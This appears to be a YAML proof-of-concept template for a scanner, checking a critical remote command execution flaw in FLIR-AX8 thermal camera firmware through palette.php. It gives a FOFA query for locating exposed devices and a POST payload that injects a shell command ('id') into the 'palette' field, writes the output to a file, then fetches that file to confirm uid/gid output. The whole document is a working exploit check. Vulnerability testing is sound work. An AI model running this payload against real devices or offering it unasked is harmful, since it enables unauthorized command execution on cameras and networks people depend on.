id: poc-yaml-flir-ax8-palette-rce
info:
  name: FLIR-AX8 palette.php 远程命令执行漏洞
  severity: critical
  tags:
  - rce
  finger: FLIR-AX8
  fofa: app="FLIR-FLIR-AX8"
variables:
  t1: random_int(100,999)
requests:
- method: POST
  path: /palette.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: palette=;id>test{{.t1}}.txt;
  expression: 'status_code == 200 &&

    contains(body,"success")

    '
- method: GET
  path: /test{{.t1}}.txt
  expression: 'status_code == 200 &&

    matches(body,`uid=\d+\(.*?\)\s+gid=\d+\(.*?\)`)

    '
transport: http
